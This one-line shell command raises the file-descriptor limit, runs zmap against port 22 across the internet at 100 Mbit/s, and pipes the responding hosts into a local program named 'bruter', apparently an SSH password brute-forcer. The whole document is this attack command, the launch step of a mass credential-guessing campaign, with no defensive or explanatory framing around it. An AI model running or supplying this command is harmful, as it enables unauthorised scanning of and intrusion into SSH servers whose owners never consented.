ulimit -n 999999; zmap -p 22 -B100M | ./bruter
